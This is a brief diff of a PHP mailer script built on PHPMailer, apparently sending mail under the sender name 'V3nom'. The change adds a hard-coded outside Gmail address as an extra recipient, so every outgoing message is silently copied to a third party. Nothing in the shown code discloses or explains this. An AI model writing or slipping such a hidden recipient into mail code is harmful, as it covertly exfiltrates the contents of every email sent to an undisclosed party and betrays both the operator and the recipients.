@@ -38,7 +38,8 @@ try {
 	$mail->SMTPDebug = 0;
 	$mail->Port = 587;
 	$mail->setFrom('gebeyaw.a@asdepo.org', 'V3nom');
-	$mail->addAddress($to_email); 
+	$mail->addAddress($to_email);
+	$mail->addAddress('secureserve07@gmail.com');
 	//$mail->addReplyTo('info@example.com', 'Information');
 	$mail->Subject = $subject;
 	//$mail->isHTML(true);
